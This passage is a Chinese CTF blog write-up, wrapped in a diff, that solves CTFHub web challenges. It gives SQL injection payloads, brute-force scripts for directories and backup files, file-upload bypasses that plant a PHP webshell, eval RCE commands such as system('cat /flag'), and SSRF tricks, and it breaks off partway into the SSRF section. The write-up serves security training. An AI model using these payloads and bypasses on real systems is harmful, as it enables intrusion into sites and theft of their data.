@@ -1,0 +1,700 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>Hexo</title>
+  <meta name="description" content="一、信息泄露1.目录遍历手点 or   python跑一下 12345678910import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;challenge-aff7702ae0df8ad6.sandbox.ctfhub.com:10800&#x2F;flag_in_here&#x2F;&quot;for i in range(5):    for j in range(5):        a &#x3D;url">
+<meta property="og:type" content="article">
+<meta property="og:title" content="保安宇">
+<meta property="og:url" content="http://example.com/2022/05/16/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91web%E9%83%A8%E5%88%86%20-%20%E5%89%AF%E6%9C%AC/index.html">
+<meta property="og:site_name" content="保安宇">
+<meta property="og:description" content="一、信息泄露1.目录遍历手点 or   python跑一下 12345678910import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;challenge-aff7702ae0df8ad6.sandbox.ctfhub.com:10800&#x2F;flag_in_here&#x2F;&quot;for i in range(5):    for j in range(5):        a &#x3D;url">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="c:/Users/xaioyu/AppData/Roaming/Typora/typora-user-images/image-20220502025226923.png">
+<meta property="og:image" content="c:/Users/xaioyu/AppData/Roaming/Typora/typora-user-images/image-20220502033718434.png">
+<meta property="og:image" content="https://bkimg.cdn.bcebos.com/pic/a6efce1b9d16fdfa3265015bb48f8c5494ee7b7e?x-bce-process=image/resize,m_lfit,w_1280,limit_1/format,f_auto">
+<meta property="og:image" content="c:/Users/xaioyu/AppData/Roaming/Typora/typora-user-images/image-20220508132646824.png">
+<meta property="og:image" content="c:/Users/xaioyu/AppData/Roaming/Typora/typora-user-images/image-20220508133500856.png">
+<meta property="og:image" content="c:/Users/xaioyu/AppData/Roaming/Typora/typora-user-images/image-20220508145314463.png">
+<meta property="og:image" content="c:/Users/xaioyu/AppData/Roaming/Typora/typora-user-images/image-20220508145422508.png">
+<meta property="og:image" content="c:/Users/xaioyu/AppData/Roaming/Typora/typora-user-images/image-20220508154343052.png">
+<meta property="og:image" content="c:/Users/xaioyu/AppData/Roaming/Typora/typora-user-images/image-20220508163858059.png">
+<meta property="og:image" content="c:/Users/xaioyu/AppData/Roaming/Typora/typora-user-images/image-20220508185912928.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20210615212740699.jpg#pic_center">
+<meta property="og:image" content="c:/Users/xaioyu/AppData/Roaming/Typora/typora-user-images/image-20220508190541062.png">
+<meta property="article:published_time" content="2022-05-15T21:57:16.018Z">
+<meta property="article:modified_time" content="2022-05-08T18:19:47.369Z">
+<meta property="article:author" content="宇">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="c:/Users/xaioyu/AppData/Roaming/Typora/typora-user-images/image-20220502025226923.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="http://example.com/2022/05/16/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91web%E9%83%A8%E5%88%86%20-%20%E5%89%AF%E6%9C%AC/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="保安宇" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/wospan" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">宇</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">宇的blog</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">项目</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">书单</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">友链</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/wospan" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/iwebued" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/cofess" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+
+    
+      
+
+    
+      
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">五月 2022</a><span class="archive-list-count">3</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2022/05/16/ctfhub%E6%8A%80%E8%83%BD%E4%B9%A6misc%E6%9D%82%E9%A1%B9%20-%20%E5%89%AF%E6%9C%AC/" class="title">(no title)</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-05-15T21:57:22.199Z" itemprop="datePublished">2022-05-16</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2022/05/16/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91web%E9%83%A8%E5%88%86%20-%20%E5%89%AF%E6%9C%AC/" class="title">(no title)</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-05-15T21:57:16.018Z" itemprop="datePublished">2022-05-16</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                
+              </p>
+              <p class="item-title">
+                <a href="/2022/05/16/php%E7%9A%84%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0%20-%20%E5%89%AF%E6%9C%AC/" class="title">(no title)</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2022-05-15T21:56:59.198Z" itemprop="datePublished">2022-05-16</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-ctfhub技能树web部分 - 副本" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2022/05/16/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91web%E9%83%A8%E5%88%86%20-%20%E5%89%AF%E6%9C%AC/" class="article-date">
+	  <time datetime="2022-05-15T21:57:16.018Z" itemprop="datePublished">2022-05-16</time>
+	</a>
+</span>
+        
+        
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/05/16/ctfhub%E6%8A%80%E8%83%BD%E6%A0%91web%E9%83%A8%E5%88%86%20-%20%E5%89%AF%E6%9C%AC/#comments" class="article-comment-link">评论</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="一、信息泄露"><a href="#一、信息泄露" class="headerlink" title="一、信息泄露"></a>一、信息泄露</h1><h2 id="1-目录遍历"><a href="#1-目录遍历" class="headerlink" title="1.目录遍历"></a>1.目录遍历</h2><p>手点</p>
+<p>or   python跑一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://challenge-aff7702ae0df8ad6.sandbox.ctfhub.com:10800/flag_in_here/&quot;</span><br><span class="line">for i in range(5):</span><br><span class="line">    for j in range(5):</span><br><span class="line">        a =url+&quot;/&quot;+str(i)+&quot;/&quot;+str(j)</span><br><span class="line">        r = requests.get(a)</span><br><span class="line">        r.encoding = &#x27;utf-8&#x27;</span><br><span class="line">        get_file=r.text</span><br><span class="line">        if &quot;flag.txt&quot; in get_file:</span><br><span class="line">            print(a)</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-phpinfo"><a href="#2-phpinfo" class="headerlink" title="2.phpinfo"></a>2.phpinfo</h2><p>网页直接  Ctrl+f 查找flag </p>
+<h2 id="3-备份文件下载"><a href="#3-备份文件下载" class="headerlink" title="3.备份文件下载"></a>3.备份文件下载</h2><h3 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h3><p>在url地址后直接尝试备份名</p>
+<p>拿python跑一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests </span><br><span class="line">url1 = &#x27;http://challenge-2cc3cabc1c847a70.sandbox.ctfhub.com:10800/&#x27;  </span><br><span class="line"># 常见的网站源码备份文件名</span><br><span class="line">list1 = [&#x27;web&#x27;, &#x27;website&#x27;, &#x27;backup&#x27;, &#x27;back&#x27;, &#x27;www&#x27;, &#x27;wwwroot&#x27;, &#x27;temp&#x27;]</span><br><span class="line"># 常见的网站源码备份文件后缀</span><br><span class="line">list2 = [&#x27;tar&#x27;, &#x27;tar.gz&#x27;, &#x27;zip&#x27;, &#x27;rar&#x27;]</span><br><span class="line">for i in list1:</span><br><span class="line">    for j in list2:</span><br><span class="line">        back = str(i) + &#x27;.&#x27; + str(j)</span><br><span class="line">        url = str(url1) + &#x27;/&#x27; + back</span><br><span class="line">        print(back + &#x27;    &#x27;, end=&#x27;&#x27;)</span><br><span class="line">        print(requests.get(url).status_code)</span><br></pre></td></tr></table></figure>
+
+<p><img src="C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20220502025226923.png" alt="image-20220502025226923"></p>
+<p><a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a>  有flag.txt  为假   直接在url上访问flag-.txt</p>
+<h3 id="bak-文件"><a href="#bak-文件" class="headerlink" title="bak 文件"></a>bak 文件</h3><p>“<em>bak文件是备份文件，为文件格式扩展名</em>，这类文件一般在【.bak】前面加上应该有原来的扩展名比如【windows.dll.bak】，或是【windows_dll.bak】，有的则是由原文件的后缀名和bak混合而成。”</p>
+<p>在url上访问index.php.bak</p>
+<h3 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h3><p> vim缓存（当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。）</p>
+<p>vim中的swp即swap文件，在编辑文件时产生，它是隐藏文件，如果原文件名是submit，则它的临时文件为submit.swp。如果文件正常退出，则此文件自动删除。</p>
+<p>输入&#x2F;.index.php.swp下载网站备份文件  拖入kali中</p>
+<p>在kali中输入vim -r index.php.swp 恢复查看文件</p>
+<h3 id="DS-Store"><a href="#DS-Store" class="headerlink" title=".DS_Store"></a>.DS_Store</h3><p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p>
+<p>访问.DS_Store  下载文件 拖入kali用cat查看文件  </p>
+<p><img src="C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20220502033718434.png" alt="image-20220502033718434"></p>
+<p>在url中访问上面标注的txt</p>
+<h1 id="二、密码口令"><a href="#二、密码口令" class="headerlink" title="二、密码口令"></a>二、密码口令</h1><h2 id="1-弱口令"><a href="#1-弱口令" class="headerlink" title="1.弱口令"></a>1.弱口令</h2><p>直接拿burp字典扫一下</p>
+<h2 id="2-默认口令"><a href="#2-默认口令" class="headerlink" title="2.默认口令"></a>2.默认口令</h2><p>直接百度一下这个eyou网关的默认账号</p>
+<p>网关(Gateway)又称<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BD%91%E9%97%B4%E8%BF%9E%E6%8E%A5%E5%99%A8/2943752">网间连接器</a>、<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%8D%8F%E8%AE%AE%E8%BD%AC%E6%8D%A2">协议转换</a>器。网关在<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E5%B1%82/4329439">网络层</a>以上实现<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E4%BA%92%E8%BF%9E/108997">网络互连</a>，是复杂的网络互连设备，仅用于两个高层协议不同的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E4%BA%92%E8%BF%9E/108997">网络互连</a>。网关既可以用于<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%B9%BF%E5%9F%9F%E7%BD%91/422004">广域网</a>互连，也可以用于<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%B1%80%E5%9F%9F%E7%BD%91">局域网</a>互连。 网关是一种充当转换重任的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/7210959">计算机系统</a>或设备。使用在不同的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E9%80%9A%E4%BF%A1%E5%8D%8F%E8%AE%AE/3351624">通信协议</a>、数据格式或语言，甚至<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/8174145">体系结构</a>完全不同的两种系统之间，网关是一个<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BF%BB%E8%AF%91%E5%99%A8/2677454">翻译器</a>。与<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%BD%91%E6%A1%A5/99310">网桥</a>只是简单地传达信息不同，网关对收到的信息要重新打包，以适应目的系统的需求。同层–应用层</p>
+<p><img src="https://bkimg.cdn.bcebos.com/pic/a6efce1b9d16fdfa3265015bb48f8c5494ee7b7e?x-bce-process=image/resize,m_lfit,w_1280,limit_1/format,f_auto" alt="网关例子"></p>
+<h1 id="三、sql注入"><a href="#三、sql注入" class="headerlink" title="三、sql注入"></a>三、sql注入</h1><h2 id="1-整数型注入"><a href="#1-整数型注入" class="headerlink" title="1.整数型注入"></a>1.整数型注入</h2><p>两个回显位</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0 union select 1，(select group_concat(table_name) from information_schema.tables where table_schema=database())</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=0 union select 1，(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flag&#x27;)</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=0 union select 1,(select group_concat(flag) from flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得flag</p>
+<h2 id="2-字符型注入"><a href="#2-字符型注入" class="headerlink" title="2.字符型注入"></a>2.字符型注入</h2><p>sql 语句为</p>
+<p>select * from news where id&#x3D;’1’</p>
+<p>使用#将后面的单引号注释掉     1’#</p>
+<p>判断and是否被过滤   1’ and 1&#x3D;1#</p>
+<p>判断or是否被过滤      1’ or 1&#x3D;1#</p>
+<p>判断列数   1’ order by 1,2,#</p>
+<p>判断注入点          -1’ union select 1,2#</p>
+<p>暴库    -1’ union select 1,database()#</p>
+<p>爆表         -1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</p>
+<p>爆字段名   -1’ union select 1,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’flag’#</p>
+<p>爆字段内容      -1’ union select 1,(select flag from flag)#</p>
+<p>得到flag</p>
+<h2 id="3-报错注入"><a href="#3-报错注入" class="headerlink" title="3.报错注入"></a>3.报错注入</h2><p><strong>判断注入</strong><br> 当场景中仅仅将SQL语句带入查询返回页面正确，没有返回点的时候，需要报错注入，用报错的回显。</p>
+<p><strong>三种方法extractvalue() updatexml() floor()</strong></p>
+<p>(1)extractvalue报错注入:0x7e就是~用来区分数据</p>
+<p>里面用select语句，不能用union select</p>
+<p>concat()函数<br>1.功能：将多个字符串连接成一个字符串。<br>2.语法：concat(str1,str2,…)<br>返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p>
+<p>extractvalue报错注入语句格式:<br>?id&#x3D;2 and extractvalue(null,concat(0x7e,(sql语句),0x7e))</p>
+<p>暴库</p>
+<p>1 and extractvalue(null,concat(0x7e,(database()),0x7e))</p>
+<p>爆表  第一张             1 and extractvalue(null,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),0x7e))</p>
+<p>第二张  limit 1,1              </p>
+<p>1 and extractvalue(null,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),0x7e))</p>
+<p>爆表成功，<code>sqli</code>库中有两张表，分别是<code>news</code>,<code>flag</code>,接下来爆字段名</p>
+<p>1 and extractvalue(null,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’flag’ limit 0,1),0x7e))</p>
+<p>爆字段</p>
+<p>1 and extractvalue(null,concat(0x7e,(select flag from flag limit 0,1),0x7e))</p>
+<p>只得一半flag</p>
+<p><strong>SQL MID()语法</strong></p>
+<p>select mid(column_name,start[,length]) from table_name</p>
+<p>得到flag</p>
+<h2 id="SQLMAP跑一下"><a href="#SQLMAP跑一下" class="headerlink" title="SQLMAP跑一下"></a>SQLMAP跑一下</h2><h1 id="四、文件上传"><a href="#四、文件上传" class="headerlink" title="四、文件上传"></a>四、文件上传</h1><h2 id="1-无验证"><a href="#1-无验证" class="headerlink" title="1.无验证"></a>1.无验证</h2><p>直接上传PHP一句话木马</p>
+<p><img src="C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20220508132646824.png" alt="image-20220508132646824"></p>
+<p>用中国蚁剑连接</p>
+<p>拿到flag</p>
+<h2 id="2-前端验证"><a href="#2-前端验证" class="headerlink" title="2.前端验证"></a>2.前端验证</h2><p>只允许.jpg|.png|.gif 后缀文件上传</p>
+<p>写入一句话php木马，改后缀名为 .jpg 成为jpg马 利用burp 抓包 重新变为.php 后缀</p>
+<p>成功上传  连接蚁剑</p>
+<p>拿到flag</p>
+<h2 id="3-htaccess"><a href="#3-htaccess" class="headerlink" title="3.   .htaccess"></a>3.   .htaccess</h2><p>.htaccess绕过</p>
+<p>.htaccess是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。</p>
+<p>.htaccess主要的作用有：URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止&#x2F;允许特定IP&#x2F;IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。 .htaccess的用途范围主要针对当前目录</p>
+<p>先上传一个内容为 SetHandler application&#x2F;x-httpd-php .png 的.htaccess文件</p>
+<p><img src="C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20220508133500856.png" alt="image-20220508133500856"></p>
+<p>可以把png后缀解析为php</p>
+<p>上传php一句话木马   burp抓包修改后缀为png 成功上传</p>
+<p>蚁剑连接</p>
+<p>拿到flag</p>
+<h2 id="4、MIME绕过"><a href="#4、MIME绕过" class="headerlink" title="4、MIME绕过"></a>4、MIME绕过</h2><p>MIME类型校验就是我们在上传文件到服务端的时候，服务端会对客户端也就是我们上传的文件的Content-Type类型进行检测，如果是白名单所允许的，则可以正常上传，否则上传失败。</p>
+<p>上传php一句话木马</p>
+<p>用bp抓包   修改content-type   为image&#x2F;jpeg</p>
+<p>成功上传</p>
+<p>蚁剑连接</p>
+<p>拿到flag</p>
+<h2 id="5、文件头检查"><a href="#5、文件头检查" class="headerlink" title="5、文件头检查"></a>5、文件头检查</h2><p>jpg、png,gif等文件在文件的头部都会有其专有的字符，都确定这是什么类型的文件</p>
+<p>上传时解析文件不能出错</p>
+<p>直接上传php图片马</p>
+<p>bp抓包   修改后缀jpg为php</p>
+<p>上传成功  连接蚁剑</p>
+<p>得到flag</p>
+<h2 id="6、00截断"><a href="#6、00截断" class="headerlink" title="6、00截断"></a>6、00截断</h2><p>php是基础c语言实现的，C语言中认为<strong>0x00是结束符号</strong>，文件上传之所以可以00截断，是因为白名单判断的时候是判断后缀，在进行路径拼接的时候用的其他值，然后在进行move_uploaded_file的时候，这个函数读取到hex值为00的字符，认为读取结束，出现00截断</p>
+<p> %00  , 0x00  , &#x2F;00  都属于00截断,利用的是服务器的解析漏洞(ascii中0表示字符串结束),所以读取字符串到00就会停止,认为已经结束。</p>
+<p><img src="C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20220508145314463.png" alt="image-20220508145314463"></p>
+<p>上传一句话PHP木马</p>
+<p><img src="C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20220508145422508.png" alt="image-20220508145422508"></p>
+<p>修改后缀</p>
+<p>上传成功   找之前题目文件上传地址为  直接访问upload&#x2F;</p>
+<p>连接蚁剑</p>
+<p>找到flag</p>
+<h2 id="7-双写后缀"><a href="#7-双写后缀" class="headerlink" title="7.双写后缀"></a>7.双写后缀</h2><p>这一关黑名单，使用str_ireplace()函数寻找文件名中存在的黑名单字符串，将它替换成空（即将它删掉），可以使用双写绕过黑名单</p>
+<p>上传1.php 然后用bp改后缀 pphphp 会过滤掉php 但会拼接成php</p>
+<p>连接蚁剑</p>
+<p>拿到flag</p>
+<h1 id="五、RCE"><a href="#五、RCE" class="headerlink" title="五、RCE"></a>五、RCE</h1><h2 id="1-eval执行"><a href="#1-eval执行" class="headerlink" title="1.eval执行"></a>1.eval执行</h2><p><img src="C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20220508154343052.png" alt="image-20220508154343052"></p>
+<p>看PHP代码</p>
+<p>查看根目录 &#x2F;?cmd&#x3D;system(“ls”);    &#x2F;&#x2F;分号不能省</p>
+<p>有无信息  再查看上一级目录</p>
+<p>&#x2F;?cmd&#x3D;system(“ls %20&#x2F;”);</p>
+<p>查看其中信息  &#x2F;?cmd&#x3D;system(“cat%20&#x2F;flag_29475”);</p>
+<p>得到flag</p>
+<h2 id="2-文件包含"><a href="#2-文件包含" class="headerlink" title="2.文件包含"></a>2.文件包含</h2><p><img src="C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20220508163858059.png" alt="image-20220508163858059"></p>
+<p>ctfhub&#x3D;system(“ls &#x2F;“);</p>
+<p>ctfhub&#x3D;system(“cat &#x2F;flag”)</p>
+<p>得到flag</p>
+<h3 id="php-x2F-x2F-input"><a href="#php-x2F-x2F-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h3><p>php:&#x2F;&#x2F;用来访问各个输入&#x2F;输出流</p>
+<p>php:&#x2F;&#x2F;input是个可以访问请求的原始数据的只读流，可以接收post请求作为输入流的输入，将请求作为PHP代码输入，以达到以post的形式进行输入的目的</p>
+<p><img src="C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20220508185912928.png" alt="image-20220508185912928"></p>
+<p><img src="https://img-blog.csdnimg.cn/20210615212740699.jpg#pic_center" alt="img"></p>
+<p>可以用php:&#x2F;&#x2F;input</p>
+<img src="C:\Users\xaioyu\AppData\Roaming\Typora\typora-user-images\image-20220508190541062.png" alt="image-20220508190541062" style="zoom:200%;" />
+
+<p>get传入?file&#x3D;php:&#x2F;&#x2F;input</p>
+<p>post传入<?php system("ls");?></p>
+<p>逐步查看</p>
+<p>得到flag</p>
+<h1 id="六、SSRF"><a href="#六、SSRF" class="headerlink" title="六、SSRF"></a>六、SSRF</h1><p> SSRT(Server-Side Request Forgery，服务器端请求伪造)，就是攻击者利用服务器能访问其他的服务器的功能，通过自己的构造服务器请求来攻击与外界不相连接的内网，我们知道内网与外网是不相通的，所以利用这一个特性，就可以利用存在缺陷的WEB应用作为代理 攻击远程 和 本地的服务器。<br>  通常造成这个漏洞的原因就是运维人员没有对web请求进行过滤和筛选处理。</p>
+<h3 id="1-1内网访问"><a href="#1-1内网访问" class="headerlink" title="1.1内网访问"></a>1.1内网访问</h3><p>直接构造：，即可拿到flag.</p>
+<p>&#x2F;?url&#x3D;<a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a></p>
+<h3 id="1-2伪协议读取文件"><a href="#1-2伪协议读取文件" class="headerlink" title="1.2伪协议读取文件"></a>1.2伪协议读取文件</h3><p>file:&#x2F;&#x2F; 协议<br>作用：<br>用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。</p>
+<p>http&#x2F;s协议<br>作用：<br>探测内网主机存活</p>
+<p>dict协议<br>作用：<br>泄露安装软件版本信息，查看端口，操作内网redis服务等</p>
+<p>Gopher协议<br>作用：<br>Gopher协议可以说是SSRF中的万金油。利用此协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。<br>在这里我们直接构造(WEB常用的本地地址)：</p>
